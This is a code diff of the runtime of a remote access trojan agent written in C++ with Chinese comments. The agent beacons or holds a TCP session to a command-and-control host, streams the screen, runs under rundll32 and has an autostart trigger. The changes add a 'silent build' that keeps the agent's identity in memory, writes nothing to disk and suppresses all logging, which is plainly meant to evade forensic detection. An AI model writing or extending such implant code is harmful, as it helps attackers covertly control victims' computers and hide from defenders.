@@ -1,5 +1,6 @@
 // agent_runtime.cpp — Agent 运行核心实现（EXE 与 DLL 共用）
 #include "agent_runtime.h"
+#include "agent_debug.h"
 
 #include "beacon.h"
 #include "cmd_dispatch.h"
@@ -119,9 +120,10 @@ namespace c2
             return s;
         }
 
-        // agent_id 持久化：读不到就随机生成并落盘（路径由调用方给出）
+        // agent_id：读不到就随机生成（是否落盘由 RAT_AGENT_PERSIST_ID 决定）
         void load_or_create_agent_id(const std::string& path, uint8_t out[kAgentIdLen])
         {
+#if RAT_AGENT_PERSIST_ID
             std::wstring wpath = utf8_to_wide(path);
             HANDLE f = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
@@ -146,6 +148,28 @@ namespace c2
                 WriteFile(f, out, kAgentIdLen, &written, nullptr);
                 CloseHandle(f);
             }
+#else
+            // 静默构建（RAT_AGENT_PERSIST_ID=0）：身份只在内存里，磁盘零写入。
+            // 代价：重启后 id 变化；另一进程无法凭 id 文件停止它（可按已知 hex 触发事件）
+            (void)path;
+            BCryptGenRandom(nullptr, out, kAgentIdLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+#endif
+        }
+
+        // 进程内唯一身份：一次进程只读/生成一次并缓存。
+        // 必要性：静默构建下 id 不落盘，若不缓存，agent_start（拿它命名停止事件）与
+        // worker（拿它上报 cookie）会各自随机出一个 id，导致"服务器看到的 id"与
+        // "停止事件名里的 id"对不上。落盘构建下这样做也省掉一次重复读文件。
+        void agent_ensure_id(const std::string& path, uint8_t out[kAgentIdLen])
+        {
+            static uint8_t cached[kAgentIdLen] = { 0 };
+            static bool ready = false;
+            if (!ready)
+            {
+                load_or_create_agent_id(path, cached);
+                ready = true;
+            }
+            std::memcpy(out, cached, kAgentIdLen);
         }
 
         AgentConfig build_config(const AgentRunArgs& a, const uint8_t agent_id[kAgentIdLen])
@@ -169,7 +193,7 @@ namespace c2
         int tcp_worker(const AgentRunArgs& a)
         {
             uint8_t agent_id[kAgentIdLen] = { 0 };
-            load_or_create_agent_id(a.id_path, agent_id);
+            agent_ensure_id(a.id_path, agent_id);
             g_id_hex = hex_of(agent_id, kAgentIdLen);
             AgentConfig cfg = build_config(a, agent_id);
             screen_stream_set_config(a.host, cfg);
@@ -177,17 +201,17 @@ namespace c2
             int delay = 1;
             while (!agent_stop_requested())
             {
-                printf("[*] connecting to %s:%u...\n", a.host.c_str(), (unsigned)a.port);
+                AGENT_LOG("[*] connecting to %s:%u...\n", a.host.c_str(), (unsigned)a.port);
                 Session s;
                 std::string err;
 
                 if (!session_handshake(s, cfg, err))
                 {
-                    printf("[-] handshake failed: %s\n", err.c_str());
+                    AGENT_LOG("[-] handshake failed: %s\n", err.c_str());
                 }
                 else
                 {
-                    printf("[+] connected, session key derived\n");
+                    AGENT_LOG("[+] connected, session key derived\n");
                     delay = 1;
                     g_sock.store((uintptr_t)s.sock);
 
@@ -210,12 +234,12 @@ namespace c2
                             continue;
                         if (h.seq <= last_seq)
                         {
-                            printf("[recv] DROP replay/out-of-order cmd=0x%04x seq=%u (last=%u)\n",
+                            AGENT_LOG("[recv] DROP replay/out-of-order cmd=0x%04x seq=%u (last=%u)\n",
                                 h.cmd, h.seq, last_seq);
                             continue;
                         }
                         last_seq = h.seq;
-                        printf("[recv] cmd=0x%04x seq=%u len=%zu\n", h.cmd, h.seq, plain.size());
+                        AGENT_LOG("[recv] cmd=0x%04x seq=%u len=%zu\n", h.cmd, h.seq, plain.size());
 
                         if (h.cmd == kCmdBye)
                             break;
@@ -249,7 +273,7 @@ namespace c2
                             break;
                     }
 
-                    printf("[-] connection lost, reconnecting...\n");
+                    AGENT_LOG("[-] connection lost, reconnecting...\n");
                     running.store(false);
                     if (ht)
                     {
@@ -274,7 +298,7 @@ namespace c2
         int beacon_worker(const AgentRunArgs& a)
         {
             uint8_t agent_id[kAgentIdLen] = { 0 };
-            load_or_create_agent_id(a.id_path, agent_id);
+            agent_ensure_id(a.id_path, agent_id);
             g_id_hex = hex_of(agent_id, kAgentIdLen);
             AgentConfig cfg = build_config(a, agent_id);
             // 屏幕流长连接同样需要配置（协议 §9）
@@ -293,7 +317,7 @@ namespace c2
         {
             AgentRunArgs* a = static_cast<AgentRunArgs*>(param);
             int rc = a->beacon ? beacon_worker(*a) : tcp_worker(*a);
-            printf("[*] agent worker exit (rc=%d)\n", rc);
+            AGENT_LOG("[*] agent worker exit (rc=%d)\n", rc);
             g_running.store(false);
             g_mode.store(0);
             return 0;
@@ -307,7 +331,7 @@ namespace c2
             std::wstring wname = utf8_to_wide(g_stop_event_name);
             g_stop_event = CreateEventW(nullptr, TRUE, FALSE, wname.c_str());
             if (!g_stop_event)
-                printf("[!] create stop event failed (err=%lu)\n", GetLastError());
+                AGENT_LOG("[!] create stop event failed (err=%lu)\n", GetLastError());
         }
 
     } // namespace
@@ -444,6 +468,11 @@ namespace c2
 
     bool agent_redirect_stdout(const std::string& path)
     {
+#if !RAT_AGENT_DEBUG
+        // 静默构建：绝不落日志文件（无论谁调用）
+        (void)path;
+        return false;
+#else
         std::wstring logw = utf8_to_wide(path);
         if (logw.empty())
             return false;
@@ -454,6 +483,7 @@ namespace c2
             return false;
         setvbuf(stdout, nullptr, _IONBF, 0);
         return true;
+#endif
     }
 
     // ---- 生命周期 ----
@@ -478,25 +508,33 @@ namespace c2
         if (g_args.log_path.empty())
             g_args.log_path = agent_default_log_path();
 
-        // 目录/日志：DLL 被 rundll32 加载时没有控制台，把 stdout 落到文件（可被 log= 覆盖）
-        std::wstring idw = utf8_to_wide(g_args.id_path);
-        size_t pos = idw.find_last_of(L'\\');
-        if (pos != std::wstring::npos)
-            ensure_dir(idw.substr(0, pos));
+        // 目录/重定向：只在会落盘/会输出时才碰文件系统与 stdout。
+        // 静默构建（RAT_AGENT_DEBUG=0）下不建目录、不放开日志、也不动宿主的 stdout。
+#if RAT_AGENT_PERSIST_ID
+        {
+            std::wstring idw = utf8_to_wide(g_args.id_path);
+            size_t pos = idw.find_last_of(L'\\');
+            if (pos != std::wstring::npos)
+                ensure_dir(idw.substr(0, pos));
+        }
+#endif
+#if RAT_AGENT_DEBUG
+        // DLL 被 rundll32 加载时没有控制台，把 stdout 落到文件（可被 log= 覆盖）
         if (g_args.redirect_stdout && GetConsoleWindow() == nullptr)
         {
             if (agent_redirect_stdout(g_args.log_path))
-                printf("---- RatAgent/%s log open %s ----\n",
+                AGENT_LOG("---- RatAgent/%s log open %s ----\n",
                     RAT_AGENT_FLAVOR, g_args.log_path.c_str());
         }
         else
         {
             setvbuf(stdout, nullptr, _IONBF, 0);
         }
+#endif
 
         // 停止事件（跨进程停止用）
         uint8_t tmp_id[kAgentIdLen] = { 0 };
-        load_or_create_agent_id(g_args.id_path, tmp_id); // 先确保 id 存在，事件名稳定
+        agent_ensure_id(g_args.id_path, tmp_id); // 进程内唯一 id（事件名必须与上报 id 一致）
         if (g_stop_event)
         {
             CloseHandle(g_stop_event);
@@ -507,7 +545,7 @@ namespace c2
         g_stop.store(false);
         g_running.store(true);
         g_mode.store(g_args.beacon ? 1 : 2);
-        printf("[*] agent_start mode=%s host=%s:%u sleeptime=%d id_path=%s log=%s\n",
+        AGENT_LOG("[*] agent_start mode=%s host=%s:%u sleeptime=%d id_path=%s log=%s\n",
             g_args.beacon ? "beacon" : "tcp", g_args.host.c_str(), (unsigned)g_args.port,
             g_args.sleeptime, g_args.id_path.c_str(), g_args.log_path.c_str());
 
@@ -631,7 +669,7 @@ namespace c2
         {
             if (!c.empty() && read_file_utf8(c, args))
             {
-                printf("[*] autostart trigger: %s -> args=\"%s\"\n", c.c_str(), args.c_str());
+                AGENT_LOG("[*] autostart trigger: %s -> args=\"%s\"\n", c.c_str(), args.c_str());
                 return true;
             }
         }
